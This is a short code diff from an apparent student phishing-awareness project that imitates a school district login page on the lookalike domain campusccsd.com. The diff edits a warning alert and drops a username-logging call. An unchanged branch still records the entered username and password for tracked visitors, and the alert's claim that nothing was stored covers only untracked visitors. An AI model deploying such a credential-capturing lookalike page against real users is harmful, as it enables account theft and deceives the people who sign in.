@@ -787,8 +787,8 @@ if(getUrl.length == 0) getUrl = "undefined";
 $('#form_signin').on('submit', function() {
 	if(getUrl == "undefined")
 	{
-		alert("You have signed into a fake phishing site that COULD have logged your password (but didn't, you can check the code). This was intended to be sent through email as a test for a Senior Capstone project. You have stumbled across this site inadvertently. Please make sure to check that you are going to campus.ccsd.net instead of campusccsd.com.");
-		new dbEntry(getUrl, $('#username')[0], null);
+		alert("You have signed into a fake phishing site that COULD have logged your password (but didn't, you can check the code). This was intended to be sent through email as a test for a Senior Capstone project. You have stumbled across this site inadvertently. Please make sure to check that you are going to campus.ccsd.net instead of campusccsd.com. All that was stored from this session is the timestamp that you clicked onto the site. Your username and password were not stored. You will now be signed on normally.");
+		
 	}
 	else new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
 });
